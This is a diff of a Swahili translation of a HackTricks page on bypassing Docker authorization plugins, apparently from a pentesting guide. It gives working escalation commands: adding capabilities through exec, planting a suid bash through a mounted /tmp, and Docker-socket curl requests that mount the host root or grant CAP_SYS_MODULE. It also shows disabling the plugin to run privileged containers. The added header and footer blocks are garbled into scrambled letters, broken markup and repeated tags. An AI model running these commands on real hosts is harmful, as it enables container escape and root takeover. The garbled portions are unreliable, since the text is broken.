@@ -1,83 +1,88 @@
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<dotsilp>
 
-Njia nyingine za kusaidia HackTricks:
+<oummpr>SupportHackTricks</smmay>
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-Mfano wa msingi wa **uthibitishaji** wa Docker ni **au yote**. Mtumiaji yeyote mwenye ruhusa ya kufikia Docker daemon anaweza **kutekeleza amri yoyote** ya mteja wa Docker. Hii pia ni kweli kwa wito unaotumia API ya Engine ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti mkubwa wa ufikiaji**, unaweza kuunda **programu-jalizi za uthibitishaji** na kuziweka kwenye usanidi wa Docker daemon yako. Kwa kutumia programu-jalizi ya uthibitishaji, msimamizi wa Docker anaweza **kuweka sera za ufikiaji za kina** kwa kusimamia ufikiaji wa Docker daemon.
+**Mfumo wa** **idhini** wa **Docker** ni **kila kitu au chochote**. Mtumiaji yeyote mwenye ruhusa ya kufikia **Docker daemon** anaweza **kufanya** amri yoyote ya mteja wa Docker. Hali hiyo hiyo inatumika kwa wito wanaotumia **API ya Injini** ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti wa ufikiaji** zaidi, unaweza kuunda **vijitabu vya idhini** na kuviweka kwenye usanidi wa **Docker daemon** yako. Kwa kutumia kijitabu cha idhini, msimamizi wa Docker anaweza **kuunda sera za ufikiaji** za kina kwa ajili ya kusimamia ufikiaji wa **Docker daemon**.
 
-# Muundo wa msingi
+# Msingi wa usanifu
 
-Programu-jalizi za Uthibitishaji wa Docker ni **programu-jalizi za nje** unazoweza kutumia kuwezesha/zuia **vitendo** vilivyotakiwa kwa Docker Daemon **kulingana** na **mtumiaji** aliyetaka na **kitendo** kilichotakiwa.
+Vijitabu vya Docker Auth ni **vijitabu vya nje** ambavyo unaweza kutumia **kuruhusu/kukataa** **vitendo** vinavyotakiwa kwa **Docker Daemon** **kulingana** na **mtumiaji** aliyeyataka na **kitendo** **kilichotakiwa**.
 
-**[Maelezo yafuatayo yanatoka kwenye nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Taarifa ifuatayo ni kutoka kwenye nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Wakati ombi la **HTTP** linapofanywa kwa Docker **daemon** kupitia CLI au kupitia API ya Engine, **mfumo wa uthibitishaji** unapitisha ombi kwa **programu-jalizi za uthibitishaji** zilizosanikishwa. Ombi lina mtumiaji (mpigaji simu) na muktadha wa amri. **Programu-jalizi** inawajibika kuamua ikiwa ita **ruhusu** au **kukataa** ombi.
+Wakati **ombwe** la **HTTP** linapotolewa kwa **daemon** ya Docker kupitia CLI au kupitia **API ya Injini**, **safu ya uthibitishaji** **inasafirisha** ombi kwa **kijitabu** cha **uthibitishaji** kilichosakinishwa. Ombi lina mtumiaji (mwanakitu) na muktadha wa amri. **Kijitabu** kina jukumu la kuamua ikiwa **kuruhusu** au **kukataa** ombi.
 
-Mchoro wa mfululizo hapa chini unaonyesha mchakato wa ruhusu na kukataa uthibitishaji:
+Mchoro wa mfuatano hapa chini unaonyesha mtiririko wa idhini ya kuruhusu na kukataa:
 
-![Mchakato wa Ruhusu Uthibitishaji](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Mchakato wa Kukataa Uthibitishaji](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Kila ombi lililotumwa kwa programu-jalizi **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** na **njia ya uthibitishaji** iliyotumiwa tu ndio inayopitishwa kwa programu-jalizi. Muhimu zaidi, **sifa za mtumiaji au alama hazipitishwi**. Hatimaye, **siyo mwili wote wa ombi/jibu unatumiwa** kwa programu-jalizi ya uthibitishaji. Ni mwili wa ombi/jibu tu ambapo `Content-Type` ni `text/*` au `application/json` ndio unatumiwa.
+Kila ombi lililotumwa kwa kijitabu **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** tu na **njia ya uthibitishaji** iliyotumika inayotumwa kwa kijitabu. Muhimu zaidi, **hakuna** **akisi** za mtumiaji au tokeni zinazotumwa. Hatimaye, **sio kila mwili wa ombi/jibu unatumwa** kwa kijitabu cha idhini. Ni wale tu wa mwili wa ombi/jibu ambapo `Content-Type` ni `text/*` au `application/json` ndio wanaotumwa.
 
-Kwa amri ambazo zinaweza kuchukua udhibiti wa uunganisho wa HTTP (`HTTP Upgrade`), kama vile `exec`, programu-jalizi ya uthibitishaji inaitwa tu kwa ombi la kwanza la HTTP. Mara tu programu-jalizi inapoidhinisha amri, uthibitishaji hautumiki kwa sehemu iliyobaki ya mchakato. Hasa, data ya utiririshaji haipitishwi kwa programu-jalizi za uthibitishaji. Kwa amri ambazo zinatoa majibu ya HTTP yaliyogawanywa, kama vile `logs` na `events`, ombi la HTTP pekee linatumwa kwa programu-jalizi za uthibitishaji.
+Kwa amri ambazo zinaweza kuweza kuingilia uhusiano wa HTTP (`HTTP Upgrade`), kama vile `exec`, kijitabu cha idhini kinaitwa tu kwa ombi la awali la HTTP. Mara kijitabu kinapokubali amri, idhini haitumiki kwa mtiririko wa mabaki. Kwa hakika, data ya mtiririko haitatumwa kwa vijitabu vya idhini. Kwa amri ambazo zinarejesha jibu la HTTP lililokatwa, kama vile `logs` na `events`, ombi la HTTP pekee ndilo linalotumwa kwa vijitabu vya idhini.
 
-Wakati wa usindikaji wa ombi/jibu, mchakato fulani wa uthibitishaji unaweza kuhitaji kuuliza maswali zaidi kwa Docker daemon. Ili kukamilisha mchakato kama huo, programu-jalizi zinaweza kuita API ya daemon kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, programu-jalizi lazima zitoa njia ya msimamizi kuwezesha usanidi wa uthibitishaji na sera za usalama.
+Wakati wa usindikaji wa ombi/jibu, mtiririko fulani wa idhini unaweza kuhitaji kufanya maswali ya ziada kwa **Docker daemon**. Ili kukamilisha mtiririko kama huo, vijitabu vinaweza kuita **API ya daemon** kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, kijitabu lazima kitoe njia kwa msimamizi kuunda sera sahihi za uthibitishaji na usalama.
 
-## Programu-Jalizi Kadhaa
+## Vijitabu Vingi
 
-Wewe ndiye **anayesajili** programu-jalizi yako kama sehemu ya **kuanza** kwa Docker daemon. Unaweza kusanikisha **programu-jalizi nyingi na kuziunganisha pamoja**. Mnyororo huu unaweza kuwa na utaratibu. Kila ombi kwa daemon linapita kwa utaratibu kupitia mnyororo. Ni wakati **programu-jalizi zote zinaruhusu ufikiaji** kwa rasilimali, ndipo ufikiaji unaruhusiwa.
+Unawajibika kwa **kujiandikisha** kijitabu chako kama sehemu ya **kuanzisha** **Docker daemon**. Unaweza kusakinisha **vijitabu vingi na kuviunganisha pamoja**. Mnyororo huu unaweza kuagizwa. Kila ombi kwa daemon hupita kwa mpangilio kupitia mnyororo. Ni tu wakati **vijitabu vyote vinapotoa ufikiaji** kwa rasilimali, ndipo ufikiaji unapatikana.
 
-# Mifano ya Programu-Jalizi
+# Mifano ya Kijitabu
 
 ## Twistlock AuthZ Broker
 
-Programu-jalizi [**authz**](https://github.com/twistlock/authz) inakuwezesha kuunda faili rahisi ya **JSON** ambayo **programu-jalizi** itakuwa **ikisoma** ili kuidhinisha maombi. Kwa hivyo, inakupa fursa ya kudhibiti kwa urahisi sana ni API zipi zinaweza kufikiwa na mtumiaji gani.
+Kijitabu [**authz**](https://github.com/twistlock/authz) kinakuruhusu kuunda faili rahisi ya **JSON** ambayo **kijitabu** kitakuwa **kikisoma** ili kuidhinisha maombi. Hivyo, inakupa fursa ya kudhibiti kwa urahisi ni vipi **API endpoints** zinaweza kufikiwa na kila mtumiaji.
 
 Hii ni mfano ambao utaruhusu Alice na Bob kuunda kontena mpya: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-Kwenye ukurasa [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Kwenye ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo
+Katika ukurasa [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Katika ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo.
 
-## Mafunzo Rahisi ya Programu-Jalizi
+## Mwongozo wa Kijitabu Rahisi
 
-Unaweza kupata **programu-jalizi rahisi kuelewa** na habari ya kina kuhusu usanikishaji na uchunguzi hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Unaweza kupata **kijitabu rahisi kueleweka** chenye taarifa za kina kuhusu usakinishaji na urekebishaji hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
 Soma `README` na msimbo wa `plugin.go` ili kuelewa jinsi inavyofanya kazi.
 
-# Kudukua Programu-Jalizi ya Uthibitishaji wa Docker
+# Docker Auth Plugin Bypass
 
-## Tathmini ufikiaji
+## Kuorodhesha ufikiaji
 
-Vitu muhimu vya kuangalia ni **endpoints zipi zinaruhusiwa** na **thamani zipi za HostConfig zinaruhusiwa**.
+Mambo makuu ya kuangalia ni **ni endpoints zipi zimekubaliwa** na **ni thamani zipi za HostConfig zimekubaliwa**.
 
-Kufanya tathmini hii unaweza **kutumia zana** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
+Ili kufanya kuorodhesha hii unaweza **kutumia chombo** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## `run --privileged` isiyoruhusiwa
+## kukataa `run --privileged`
 
-### Ruhusa ya Chini
+### Haki za chini
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### Kuendesha chombo na kisha kupata kikao cha mamlaka
+### Running a container and then getting a privileged session
 
-Katika kesi hii, msimamizi wa mfumo **amezuia watumiaji kufunga diski na kuendesha vyombo na bendera ya `--privileged`** au kutoa uwezo wowote ziada kwa chombo:
+Katika kesi hii, sysadmin **amezuia watumiaji kuunganisha volumu na kuendesha kontena kwa bendera `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-Hata hivyo, mtumiaji anaweza **kuunda kikao ndani ya kontena inayofanya kazi na kumpa mamlaka ya ziada**:
+Hata hivyo, mtumiaji anaweza **kuunda shell ndani ya kontena linaloendesha na kutoa haki za ziada**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -89,11 +94,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Sasa, mtumiaji anaweza kutoroka kutoka kwenye chombo kwa kutumia moja ya [**njia zilizojadiliwa hapo awali**](./#privileged-flag) na **kuongeza mamlaka** ndani ya mwenyeji.
+Sasa, mtumiaji anaweza kutoroka kutoka kwenye kontena akitumia yoyote ya [**mbinu zilizozungumziwa hapo awali**](./#privileged-flag) na **kuinua mamlaka** ndani ya mwenyeji.
 
-## Weka Folda Inayoweza Kuandikwa
+## Mount Writable Folder
 
-Katika kesi hii, msimamizi wa mfumo **amezuia watumiaji kuendesha vyombo na bendera ya `--privileged`** au kutoa uwezo wowote ziada kwa chombo, na amewaruhusu tu kuweka folda ya `/tmp`:
+Katika kesi hii, sysadmin **amekataza watumiaji kuendesha kontena na bendera ya `--privileged`** au kutoa uwezo wowote wa ziada kwa kontena, na aliruhusu tu kuunganisha folda ya `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -103,25 +108,25 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 {% hint style="info" %}
-Tafadhali kumbuka kuwa huenda usiweze kufunga saraka `/tmp` lakini unaweza kufunga **saraka nyingine inayoweza kuandikwa**. Unaweza kupata saraka zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
+Kumbuka kwamba huenda usiweze kuunganisha folda `/tmp` lakini unaweza kuunganisha **folda nyingine inayoweza kuandikwa**. Unaweza kupata saraka zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`
 
-**Tafadhali kumbuka kuwa sio saraka zote kwenye kompyuta ya Linux zitasaidia biti ya suid!** Ili kuchunguza ni saraka zipi zinasaidia biti ya suid, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii biti ya suid.
+**Kumbuka kwamba si saraka zote katika mashine ya linux zitasaidia kipande cha suid!** Ili kuangalia ni saraka zipi zinazosupport kipande cha suid, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii kipande cha suid.
 
-Pia kumbuka kuwa ikiwa unaweza **kufunga `/etc`** au saraka nyingine **yenye faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena ya docker kama mtumiaji wa root ili **kuzitumia vibaya kwenye mwenyeji** na kuongeza mamlaka (labda kwa kubadilisha `/etc/shadow`)
+Kumbuka pia kwamba ikiwa unaweza **kuunganisha `/etc`** au folda nyingine yoyote **iliyokuwa na faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena la docker kama root ili **uzitumie kwenye mwenyeji** na kupandisha mamlaka (huenda ukibadilisha `/etc/shadow`)
 {% endhint %}
 
-## Ncha ya API isiyosahihishwa
+## Kipengele cha API Kisichokaguliwa
 
-Jukumu la msimamizi wa mfumo anayeweka programu-jalizi hii ni kudhibiti vitendo na mamlaka gani kila mtumiaji anaweza kufanya. Kwa hivyo, ikiwa msimamizi anachukua njia ya **orodha nyeusi** na kumweka kipaumbele kwa ncha za API na sifa, anaweza **kusahau baadhi yao** ambayo inaweza kuruhusu mtu mwenye nia mbaya kuongeza mamlaka.
+Wajibu wa sysadmin anayekamilisha plugin hii ni kudhibiti ni vitendo vipi na ni mamlaka gani kila mtumiaji anaweza kutekeleza. Hivyo, ikiwa admin atachukua mbinu ya **blacklist** na viwango na sifa, huenda **akasahau baadhi yao** ambayo yanaweza kumruhusu mshambuliaji **kupandisha mamlaka.**
 
-Unaweza kuangalia API ya docker kwenye [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Unaweza kuangalia API ya docker katika [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Muundo wa JSON usiothibitishwa
+## Muundo wa JSON Usio Kagua
 
-### Binds kwenye mizizi
+### Binds katika root
 
-Inawezekana kwamba wakati msimamizi wa mfumo alipoweka kinga ya kifaa cha docker, alisahau kuhusu **parameta muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
-Katika mfano ufuatao, inawezekana kutumia hitilafu hii ya usanidi kujenga na kuendesha kontena ambalo linafunga saraka ya mizizi (/) ya mwenyeji:
+Inawezekana kwamba wakati sysadmin alikamilisha firewall ya docker alikumbuka **kuhusu parameta muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
+Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena linalounganisha folda ya root (/) ya mwenyeji:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -132,30 +137,30 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-Tafadhali kumbuka jinsi katika mfano huu tunatumia **`Binds`** kama ufunguo wa ngazi ya juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**
+Kumbuka jinsi katika mfano huu tunatumia **`Binds`** param kama ufunguo wa kiwango cha juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**
 {% endhint %}
 
 ### Binds katika HostConfig
 
-Fuata maagizo sawa na **Binds katika root** kwa kufanya **ombi** hili kwa Docker API:
+Fuata maelekezo sawa na **Binds katika root** ukifanya hii **ombio** kwa Docker API:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
-### Kufunga kwenye mizizi
+### Mounts in root
 
-Fuata maagizo yaleyale kama kwa **Kufunga kwenye mizizi** kwa kutekeleza **ombi** hili kwenye API ya Docker:
+Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa API ya Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### Kufunga katika HostConfig
+### Mounts in HostConfig
 
-Fuata maagizo sawa na **Binds katika root** kwa kufanya **ombi** hili kwa Docker API:
+Fuata maelekezo sawa na yale ya **Binds in root** ukifanya **ombile** hili kwa API ya Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Atributi ya JSON ambayo hayajakaguliwa
+## Unchecked JSON Attribute
 
-Inawezekana kwamba wakati msimamizi wa mfumo alipoweka firewall ya docker, **alipuuza baadhi ya sifa muhimu ya parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama vile "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao, inawezekana kutumia hitilafu hii ya usanidi kujenga na kuendesha chombo na uwezo wa **SYS\_MODULE**:
+Inawezekana kwamba wakati sysadmin alipoandika moto wa docker alisahau kuhusu **sifa muhimu za parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao inawezekana kutumia makosa haya kuunda na kuendesha kontena lenye uwezo wa **SYS\_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -166,12 +171,12 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 {% hint style="info" %}
-**`HostConfig`** ndiyo ufunguo ambao kwa kawaida una **mamlaka muhimu** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumza hapo awali, angalia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kuepuka vizuizi.
+**`HostConfig`** ni ufunguo ambao mara nyingi unashikilia **privileges** **za kuvutia** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumzia hapo awali, zingatia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kupita vizuizi.
 {% endhint %}
 
-## Kulemaza Plugin
+## Kuondoa Plugin
 
-Ikiwa **sysadmin** amesahau **kuzuia** uwezo wa **kulemaza** **plugin**, unaweza kutumia hii fursa kulemaza kabisa!
+Ikiwa **sysadmin** **alipokosa** **kuzuia** uwezo wa **kuondoa** **plugin**, unaweza kutumia hii kuondoa kabisa!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -183,27 +188,32 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Kumbuka **kuwasha upya programu-jalizi baada ya kuongeza kiwango cha upatikanaji**, au **kuanzisha upya huduma ya docker haitafanya kazi**!
+Kumbuka ku **re-enable plugin baada ya kupandisha** au **kuanzisha huduma ya docker hakutafanya kazi**!
 
-## Mbinu za Kudukua Programu-Jalizi ya Uthibitishaji
+## Mwandiko wa Bypass ya Auth Plugin
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## Marejeo
+## Marejeleo
+{% hnt stye="acceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
-* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
+<dtil>
 
+<ummr>SupportHackTricks</smmay>
 
-<details>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
